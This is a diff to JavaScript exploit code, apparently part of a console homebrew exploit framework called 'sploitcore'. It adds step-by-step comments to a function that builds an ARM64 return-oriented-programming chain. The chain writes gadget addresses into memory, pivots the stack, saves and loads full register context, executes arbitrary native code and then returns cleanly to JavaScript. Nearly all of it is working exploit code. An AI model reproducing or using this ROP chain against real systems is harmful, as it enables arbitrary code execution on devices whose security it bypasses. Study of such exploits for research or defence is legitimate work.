@@ -478,7 +478,7 @@ sploitcore.prototype.call = function(funcptr, args, fargs, registers, dump_regs)
 		var sp = this.getSP();
 
 		dlog('Starting holy rop');
-		var jaddr = this.mref(0x39FEEC); // First gadget addr
+		var jaddr = this.mref(0x39FEEC); // First gadget addr, loads X8 with a fixed address.
 		dlog('New jump at ' + paddr(jaddr));
 		dlog('Assigning function pointer');
 
@@ -525,17 +525,24 @@ sploitcore.prototype.call = function(funcptr, args, fargs, registers, dump_regs)
 		var loadarea = this.malloc(0x400);
 		var dumparea = this.malloc(0x400);
 
+
+		// Step 1: Load X8 with a fixed address, control X0:X2
+
 		this.write8(context_load_struct, fixed, 0x00 >> 2);
 		this.write8(load_x0_w1_x2_x9_blr_x9, fixed, 0x08 >> 2);
 		this.write8(load_x2_x30_mov_sp_into_x2_br_x30, fixed, 0x10 >> 2);
 		this.write8(load_x0_w1_x2_x9_blr_x9, fixed, 0x18 >> 2);
 		this.write8(block_struct_1, fixed, 0x28 >> 2);
 
+		// Step 2: Stack pivot to SP - 0x8000. -0x30 to use a LR-loading gadget.
+
 		sp = add2(sp, -0x8030);
 		this.write8(load_x2_x8_br_x2, context_load_struct, 0x58 >> 2);
 		this.write8(sp, context_load_struct, 0x68 >> 2);
 		this.write8(returngadg, context_load_struct, 0x158 >> 2);
 		this.write8(add2(sp, 0x8030), context_load_struct, 0x168 >> 2);
+
+		// Step 3: Perform a full context-save of all registers to savearea.
 
 		this.write8(savearea, block_struct_1, 0x0 >> 2);
 		this.write8(load_x30_from_sp_br_x2, block_struct_1, 0x10 >> 2);
@@ -547,8 +554,12 @@ sploitcore.prototype.call = function(funcptr, args, fargs, registers, dump_regs)
 
 		sp = add2(sp, 0x30);
 
+		// Step 4: Perform a full context-load from a region we control.
+
 		this.write8(loadarea, block_struct_2, 0x00 >> 2);
 		this.write8(loadgadg, block_struct_2, 0x10 >> 2);
+
+		// Step 5: Write desired register contents to the context load region.
 
 		this.write8(sp, loadarea, 0xF8 >> 2); // Can write an arbitrary stack ptr here, for argument passing
 		this.write8(loadgadg_stage2, loadarea, 0x100 >> 2); // Return from load to load-stage2
@@ -597,6 +608,11 @@ sploitcore.prototype.call = function(funcptr, args, fargs, registers, dump_regs)
 		// that many stack arguments, or shit'd crash.
 
 		// ROP currently begins at sp + 0xE0
+
+		// Step 6: [Arbitrary code executes here]
+
+		// Step 7: Post-code execution cleanup. Dump all registers to another save area,
+		//         return cleanly to javascript.
 
 		this.write8(add2(dumparea, 0x300 - 0x10), sp, (0xE0 + 0x28) >> 2); // Load X19 = dumparea + 0x300 - 0x10
 		this.write8(str_x20, sp, (0xE0 + 0x38) >> 2);                      // Load LR with str_x20
